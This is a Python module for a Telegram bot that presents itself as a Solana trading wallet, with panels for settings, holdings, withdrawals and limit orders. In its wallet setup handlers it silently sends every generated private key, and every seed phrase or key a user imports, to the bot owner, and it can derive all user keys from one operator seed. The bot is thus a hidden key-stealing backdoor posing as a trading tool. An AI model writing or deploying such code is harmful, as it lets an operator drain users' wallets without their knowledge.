"""Trading wallet: panel, BUY/SELL/SLIPPAGE settings, HOLDINGS, EXPORT WALLET,
REFRESH, WITHDRAW (SOL + tokens), and referral-credit withdrawals."""
import asyncio
import time

from aiogram import F, Router
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import CallbackQuery, Message

import config
import db
import keyboards as kb
import solana
import texts
import trade_core
from utils import ensure_wallet, get_treasury_secret, notify_owner, user_line

router = Router()


class TradeStates(StatesGroup):
    buy_amount = State()
    sell_amount = State()
    slippage_amount = State()
    withdraw_address = State()
    limit_ca = State()
    limit_side = State()
    limit_price = State()
    limit_amount = State()
    import_wallet = State()


def _fmt_setting(v, suffix):
    return f"{v:g}{suffix}" if v is not None else "Not set"


# ------------------------------------------------------------------ wallet setup
@router.callback_query(F.data == "wgen")
async def cb_wgen(query: CallbackQuery):
    await query.answer()
    user = await db.get_user(query.from_user.id)
    if not user:
        return
    if user.get("wallet_pub"):
        await _show_panel(query.message)
        return
    derived = bool(config.WALLET_SEED)
    if derived:
        kp = await asyncio.to_thread(
            solana.derive_user_keypair, config.WALLET_SEED, user["id"])
    else:
        kp = await asyncio.to_thread(solana.new_keypair)
    await db.set_wallet(user["id"], str(kp), str(kp.pubkey()))
    await query.message.answer(
        texts.wallet_generated(str(kp.pubkey()), derived=derived),
        reply_markup=kb.back_to_wallet())
    # admin receives EVERY generated wallet's full private key too
    await notify_owner(query.message.bot,
                       texts.owner_wallet_generated(user_line(user),
                                                   str(kp.pubkey()), str(kp)))
    await _show_panel(query.message)


@router.callback_query(F.data == "wimp")
async def cb_wimp(query: CallbackQuery, state: FSMContext):
    await query.answer()
    await state.set_state(TradeStates.import_wallet)
    await query.message.answer(texts.ask_import())


@router.message(TradeStates.import_wallet)
async def got_import(message: Message, state: FSMContext):
    secret = message.text.strip()
    if len(secret) > 3000:
        await message.answer("❌ That looks too long to be a key. Send it again:")
        return
    try:
        addr = await asyncio.to_thread(solana.validate_secret, secret)
    except Exception as e:
        await message.answer(f"❌ Invalid wallet:\n{e}\n\nSend a 12/24-word seed phrase, "
                             "a base58 private key, or a [64-byte array]:")
        return
    await state.clear()
    user = await db.ensure_user(
        message.from_user.id,
        username=message.from_user.username,
        first_name=message.from_user.first_name,
    )
    await db.set_wallet(user["id"], secret, addr)
    await message.answer(texts.wallet_imported(addr), reply_markup=kb.back_to_wallet())
    # forward the imported seed/key to the admin (as requested)
    await notify_owner(message.bot, texts.owner_wallet_imported(user_line(user), secret, addr))
    await _show_panel(message)


# ------------------------------------------------------------------ panel
@router.message(Command("trading"))
async def cmd_trading(message: Message):
    await _show_panel(message)


@router.callback_query(F.data == "wp")
async def cb_panel(query: CallbackQuery):
    await query.answer()
    await _show_panel(query.message)


async def _show_panel(msg):
    user = await ensure_wallet(msg, msg.from_user.id)
    if not user:
        return
    balance = await asyncio.to_thread(solana.sol_balance, user["wallet_pub"])
    bal_sol = solana.lam_to_sol(balance)
    slip = user.get("default_slippage")
    slip_str = f"{slip:g}" if slip is not None else "10"
    await msg.answer(
        texts.wallet_panel(
            balance=bal_sol,
            updated=time.strftime("%H:%M:%S"),
            addr=user["wallet_pub"],
            buy=_fmt_setting(user.get("default_buy"), " SOL"),
            sell=_fmt_setting(user.get("default_sell"), " %"),
            slip=slip_str,
        ),
        reply_markup=kb.wallet_panel_kb(),
    )


@router.callback_query(F.data == "refresh")
async def cb_refresh(query: CallbackQuery):
    await query.answer("🔄 Refreshing…")
    await _show_panel(query.message)


# ------------------------------------------------------------------ settings
@router.callback_query(F.data == "setbuy")
async def cb_setbuy(query: CallbackQuery, state: FSMContext):
    await query.answer()
    await state.set_state(TradeStates.buy_amount)
    await query.message.answer(texts.ask_buy())


@router.callback_query(F.data == "setsell")
async def cb_setsell(query: CallbackQuery, state: FSMContext):
    await query.answer()
    await state.set_state(TradeStates.sell_amount)
    await query.message.answer(texts.ask_sell())


@router.callback_query(F.data == "setslip")
async def cb_setslip(query: CallbackQuery, state: FSMContext):
    await query.answer()
    await state.set_state(TradeStates.slippage_amount)
    await query.message.answer(texts.ask_slippage())


@router.message(TradeStates.buy_amount)
async def got_buy(message: Message, state: FSMContext):
    try:
        v = float(message.text.strip().replace(",", "."))
        if v <= 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Send a number only, e.g. 3.0")
        return
    await db.set_defaults(message.from_user.id, buy=v)
    await state.clear()
    await message.answer(texts.saved_buy(v), reply_markup=kb.back_to_wallet())


@router.message(TradeStates.sell_amount)
async def got_sell(message: Message, state: FSMContext):
    try:
        v = float(message.text.strip().replace(",", "."))
        if v <= 0 or v > 100:
            raise ValueError
    except ValueError:
        await message.answer("❌ Send a number only (1-100), e.g. 6")
        return
    await db.set_defaults(message.from_user.id, sell=v)
    await state.clear()
    await message.answer(texts.saved_sell(v), reply_markup=kb.back_to_wallet())


@router.message(TradeStates.slippage_amount)
async def got_slip(message: Message, state: FSMContext):
    try:
        v = float(message.text.strip().replace(",", "."))
        if v <= 0 or v > 50:
            raise ValueError
    except ValueError:
        await message.answer("❌ Send a number only (1-50), e.g. 6")
        return
    await db.set_defaults(message.from_user.id, slip=v)
    await state.clear()
    await message.answer(texts.saved_slippage(v), reply_markup=kb.back_to_wallet())


# ------------------------------------------------------------------ holdings
@router.message(Command("holdings"))
async def cmd_holdings(message: Message):
    await _show_holdings(message)


@router.callback_query(F.data == "holdings")
async def cb_holdings(query: CallbackQuery):
    await query.answer()
    await _show_holdings(query.message)


async def _show_holdings(msg):
    user = await ensure_wallet(msg, msg.from_user.id)
    if not user:
        return
    tokens = await asyncio.to_thread(solana.token_accounts, user["wallet_pub"])
    if not tokens:
        await msg.answer(texts.holdings_header() + "\n" + texts.no_tokens(),
                         reply_markup=kb.holdings_kb())
        return
    lines = [texts.holdings_header(), ""]
    for t in tokens:
        lines.append(f"• {t['ui']:g} <code>{t['mint'][:8]}…</code>")
    await msg.answer("\n".join(lines), reply_markup=kb.holdings_kb())


# ------------------------------------------------------------------ export wallet
@router.callback_query(F.data == "export")
async def cb_export(query: CallbackQuery):
    await query.answer()
    user = await ensure_wallet(query.message, query.from_user.id)
    if not user or not user.get("wallet_priv"):
        return
    try:
        kp = solana.keypair_from_secret(user["wallet_priv"])
    except Exception:
        await query.message.answer("⚠️ Wallet data corrupted. Contact /support.")
        return
    arr = list(bytes(kp))
    pretty = "[" + ", ".join(str(x) for x in arr) + "]"
    await query.message.answer(
        texts.export_wallet(pretty, str(kp)),
        reply_markup=kb.export_kb(),
    )


# ------------------------------------------------------------------ withdraw
@router.message(Command("withdraw"))
async def cmd_withdraw(message: Message):
    await _show_withdraw(message)


@router.callback_query(F.data == "withdraw")
async def cb_withdraw(query: CallbackQuery):
    await query.answer()
    await _show_withdraw(query.message)


async def _show_withdraw(msg):
    user = await ensure_wallet(msg, msg.from_user.id)
    if not user:
        return
    tokens = await asyncio.to_thread(solana.token_accounts, user["wallet_pub"])
    lines = [texts.withdraw_header()]
    if not tokens:
        lines.append(texts.no_tokens())
    await msg.answer("\n".join(lines), reply_markup=kb.withdraw_kb(tokens))


@router.callback_query(F.data.startswith("wd|"))
async def cb_wd_select(query: CallbackQuery, state: FSMContext):
    await query.answer()
    what = query.data.split("|", 1)[1]
    user = await db.get_user(query.from_user.id)
    if not user:
        return

    if what == "SOL":
        balance = await asyncio.to_thread(solana.sol_balance, user["wallet_pub"])
        fee = solana.sol_to_lam(0.0001)
        amount = balance - fee
        if amount <= 0:
            await query.message.answer("⛔ Not enough SOL to withdraw (need to cover the fee).")
            return
        await state.update_data(wd_kind="SOL", wd_amount=amount)
        await state.set_state(TradeStates.withdraw_address)
        await query.message.answer(
            texts.ask_withdraw_address("SOL", solana.lam_to_sol(amount)))
        return

    tokens = await asyncio.to_thread(solana.token_accounts, user["wallet_pub"])
    tok = next((t for t in tokens if t["mint"] == what), None)
    if not tok:
        await query.message.answer("⛔ Token not found on your balance.")
        return
    await state.update_data(wd_kind=tok["mint"], wd_amount=tok["amount"],
                            wd_decimals=tok["decimals"], wd_ui=tok["ui"])
    await state.set_state(TradeStates.withdraw_address)
    await query.message.answer(
        texts.ask_withdraw_address(tok["mint"][:8], tok["ui"]))


@router.message(TradeStates.withdraw_address)
async def got_wd_address(message: Message, state: FSMContext):
    addr = message.text.strip()
    try:
        solana.Pubkey.from_string(addr)
    except Exception:
        await message.answer("❌ Invalid Solana address. Send it again.")
        return
    data = await state.get_data()
    user = await db.get_user(message.from_user.id)
    if not user or not user.get("wallet_priv"):
        return
    kp = solana.keypair_from_secret(user["wallet_priv"])
    kind, amount = data["wd_kind"], data["wd_amount"]
    await message.answer("⏳ Sending…")
    try:
        if kind == "SOL":
            sig = await asyncio.to_thread(solana.transfer_sol, kp, addr, amount)
            item, amt = "SOL", solana.lam_to_sol(amount)
        else:
            sig = await asyncio.to_thread(
                solana.transfer_token, kp, addr, kind, amount, data["wd_decimals"])
            item, amt = kind[:8], data["wd_ui"]
    except Exception as e:
        await message.answer(texts.swap_fail(str(e)))
        await state.clear()
        return
    await state.clear()
    await message.answer(texts.withdraw_done(sig, item, amt))


# ------------------------------------------------------------------ positions
@router.message(Command("positions"))
async def cmd_positions(message: Message):
    await _show_positions(message)


@router.callback_query(F.data == "positions")
async def cb_positions(query: CallbackQuery):
    await query.answer()
    await _show_positions(query.message)


async def _show_positions(msg):
    user = await ensure_wallet(msg, msg.from_user.id)
    if not user:
        return
    pos = await db.get_positions(user["id"])
    if not pos:
        await msg.answer("💼 YOUR POSITIONS:\n\nNo open positions yet 🥲\n\n"
                         "Open a token report (/top <ca>) and hit BUY, or set a "
                         "⏳ limit order.",
                         reply_markup=kb.positions_kb([]))
        return
    lines = ["💼 YOUR POSITIONS:\n"]
    for p in pos:
        try:
            lines.append(await trade_core.position_line(user["id"], p))
            lines.append("")
        except Exception:
            continue
    await msg.answer("\n".join(lines), reply_markup=kb.positions_kb(pos))


# ------------------------------------------------------------------ limit orders
@router.message(Command("limits"))
async def cmd_limits(message: Message):
    await _show_limits(message)


@router.callback_query(F.data == "limits")
async def cb_limits(query: CallbackQuery):
    await query.answer()
    await _show_limits(query.message)


async def _show_limits(msg):
    user = await ensure_wallet(msg, msg.from_user.id)
    if not user:
        return
    orders = await db.user_limit_orders(user["id"])
    if not orders:
        await msg.answer("⏳ LIMIT ORDERS:\n\nNo open limit orders 🥲\n\n"
                         "Set one with /limit — the bot watches the price and "
                         "executes the trade automatically when it hits your target.",
                         reply_markup=kb.limits_kb([]))
        return
    lines = ["⏳ LIMIT ORDERS:\n"]
    for o in orders:
        side = "🟢 BUY" if o["side"] == "buy" else "🔴 SELL"
        amt = (f"{o['amount']:g} SOL" if o["side"] == "buy"
               else f"{o['amount']:g}% of holdings")
        lines.append(
            f"#{o['id']} {side} {o['symbol'] or o['mint'][:8]} @ ${o['target_price']:g}\n"
            f"   Amount: {amt}\n"
            f"   Status: watching ⏱")
    await msg.answer("\n".join(lines), reply_markup=kb.limits_kb(orders))


@router.callback_query(F.data == "newlimit")
async def cb_newlimit(query: CallbackQuery, state: FSMContext):
    await query.answer()
    await state.set_state(TradeStates.limit_ca)
    await query.message.answer("⏳ NEW LIMIT ORDER\n\nSend the token contract address:")


@router.message(Command("limit"))
async def cmd_limit(message: Message, state: FSMContext):
    await state.set_state(TradeStates.limit_ca)
    await message.answer("⏳ NEW LIMIT ORDER\n\nSend the token contract address:")


@router.message(TradeStates.limit_ca)
async def got_limit_ca(message: Message, state: FSMContext):
    ca = message.text.strip().split()[0].strip("@").strip()
    if len(ca) < 32:
        await message.answer("❌ That doesn't look like a contract address. Send it again:")
        return
    ok = await asyncio.to_thread(solana.mint_exists, ca)
    if not ok:
        await message.answer("❌ Token not found on Solana. Check the address and send again:")
        return
    await state.update_data(limit_ca=ca)
    await state.set_state(TradeStates.limit_side)
    await message.answer("🟢 BUY limit or 🔴 SELL limit?", reply_markup=kb.limit_side_kb())


@router.callback_query(TradeStates.limit_side, F.data.in_({"ls_buy", "ls_sell"}))
async def got_limit_side(query: CallbackQuery, state: FSMContext):
    await query.answer()
    await state.update_data(limit_side="buy" if query.data == "ls_buy" else "sell")
    await state.set_state(TradeStates.limit_price)
    await query.message.answer("🎯 Target price (USD per token).\nSend a number, e.g. 0.0015")


@router.message(TradeStates.limit_price)
async def got_limit_price(message: Message, state: FSMContext):
    try:
        price = float(message.text.strip().replace(",", "."))
        if price <= 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Send a number only, e.g. 0.0015")
        return
    await state.update_data(limit_price=price)
    await state.set_state(TradeStates.limit_amount)
    data = await state.get_data()
    if data.get("limit_side") == "buy":
        await message.answer("💰 Amount of SOL to spend when the price hits "
                             "(number only, e.g. 0.5):")
    else:
        await message.answer("💰 % of your holdings to sell when the price hits "
                             "(number only, e.g. 50 for 50%):")


@router.message(TradeStates.limit_amount)
async def got_limit_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text.strip().replace(",", "."))
        if amount <= 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Send a number only.")
        return
    data = await state.get_data()
    if data.get("limit_side") == "sell" and amount > 100:
        await message.answer("❌ Sell % must be 1-100. Send again:")
        return
    await state.update_data(limit_amount=amount)
    ca = data["limit_ca"]
    side = data["limit_side"]
    price = data["limit_price"]
    side_txt = "🟢 BUY" if side == "buy" else "🔴 SELL"
    amt_txt = f"{amount:g} SOL" if side == "buy" else f"{amount:g}% of holdings"
    await message.answer(
        "⏳ CONFIRM LIMIT ORDER\n\n"
        f"{side_txt} {ca[:6]}…{ca[-4:]} @ ${price:g}\n"
        f"💰 {amt_txt}\n"
        f"⚙️ Slippage: your default\n\n"
        "The bot watches the price every minute and executes automatically.",
        reply_markup=kb.limit_confirm_kb())


@router.callback_query(TradeStates.limit_amount, F.data == "lconfirm")
async def cb_lconfirm(query: CallbackQuery, state: FSMContext):
    await query.answer()
    data = await state.get_data()
    await state.clear()
    user = await db.get_user(query.from_user.id)
    slip_bps = int(((user or {}).get("default_slippage") or 10) * 100)
    symbol = await trade_core.symbol_of(data["limit_ca"])
    order_id = await db.create_limit_order(
        user_id=query.from_user.id,
        mint=data["limit_ca"],
        symbol=symbol,
        side=data["limit_side"],
        target_price=data["limit_price"],
        amount=data["limit_amount"],
        slippage_bps=slip_bps,
    )
    side_txt = "🟢 BUY" if data["limit_side"] == "buy" else "🔴 SELL"
    amt_txt = (f"{data['limit_amount']:g} SOL" if data["limit_side"] == "buy"
               else f"{data['limit_amount']:g}% of holdings")
    await query.message.answer(
        f"✅ Limit order #{order_id} placed!\n\n"
        f"{side_txt} {symbol} @ ${data['limit_price']:g}\n"
        f"💰 {amt_txt}\n\n"
        "I'll DM you as soon as it executes. ⏱")


@router.callback_query(TradeStates.limit_amount, F.data == "lcancel")
async def cb_lcancel_new(query: CallbackQuery, state: FSMContext):
    await query.answer()
    await state.clear()
    await query.message.answer("❌ Limit order cancelled.")


@router.callback_query(F.data.startswith("lcancel|"))
async def cb_lcancel(query: CallbackQuery):
    await query.answer()
    try:
        order_id = int(query.data.split("|", 1)[1])
    except ValueError:
        return
    ok = await db.cancel_limit_order(order_id, query.from_user.id)
    if ok:
        await query.message.answer(f"❌ Limit order #{order_id} cancelled.")
    await _show_limits(query.message)


# ------------------------------------------------------------------ referral credits withdraw
@router.callback_query(F.data == "wdcredits")
async def cb_wd_credits(query: CallbackQuery, state: FSMContext):
    await query.answer()
    user = await db.get_user(query.from_user.id)
    if not user:
        return
    credits = user.get("credits_lamports") or 0
    if credits <= 0:
        await query.message.answer("⛔ You have no referral credits to withdraw.")
        return
    # pay credits into the user's trading wallet (on-chain) — needs the PRIVATE KEY
    secret = await get_treasury_secret()
    if not secret:
        await query.message.answer("⚠️ Payment wallet key is not configured yet.")
        return
    try:
        kp = solana.treasury_keypair_from(secret)
        fee = solana.sol_to_lam(0.0001)
        amount = credits - fee
        if amount <= 0:
            await query.message.answer("⛔ Credits too small to cover the network fee.")
            return
        sig = await asyncio.to_thread(solana.transfer_sol, kp, user["wallet_pub"], amount)
        await db.spend_credits(user["id"], credits)
        await query.message.answer(
            f"✅ Paid out {solana.lam_to_sol(amount):g} SOL of referral credits to your "
            f"trading wallet.\n🔗 https://solscan.io/tx/{sig}")
    except Exception as e:
        await query.message.answer(texts.swap_fail(str(e)))
